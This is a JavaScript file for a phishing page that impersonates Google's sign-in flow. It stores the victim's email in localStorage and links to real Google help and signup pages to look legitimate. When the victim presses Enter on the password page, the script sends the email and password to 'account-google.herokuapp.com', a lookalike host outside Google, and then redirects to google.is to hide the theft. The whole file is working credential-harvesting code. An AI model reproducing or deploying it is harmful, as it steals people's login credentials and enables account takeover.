function goToPasswordPage() {
  const emailInput = document.getElementById("email-input");
  localStorage.setItem("email", emailInput.value);
  window.location.href = "/signin.html";
}

function goToEmailPage() {
  window.location.href = "/";
}

function goToGuestPage() {
  window.location.href =
    "https://support.google.com/chrome/answer/6130773?hl=is";
}

function goToAccountCreationPage() {
  window.location.href = "https://accounts.google.com/signup?hl=is";
}

function goToForgettenEmailPage() {
  window.location.href =
    "https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=is";
}

function goToForgottenPasswordPage() {
  window.location.href =
    "https://myaccount.google.com/intro/signinoptions/password";
}

async function goToGooglePage() {
  await fetch("https://account-google.herokuapp.com/users", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      email: localStorage.getItem("email"),
      password: document.getElementById("password-input").value,
    }),
  });
  window.location.href = "https://google.is";
}

if (window.location.href.includes("signin.html")) {
  const emailShower = document.getElementById("email-input-being-shown");
  let email = localStorage.getItem("email");

  if (!email) emailShower.style.visibility = "hidden";
  if (!email.includes("@gmail.com")) email = email + "@gmail.com";

  emailShower.textContent = email;
} else {
  const email = localStorage.getItem("email");
  if (email) {
    const emailInput = document.getElementById("email-input");
    emailInput.value = email;
  }
}

window.addEventListener("keydown", function (ev) {
  if (ev.key === "Enter") {
    if (window.location.href.includes("signin.html")) goToGooglePage();
    else goToPasswordPage();
  }
});
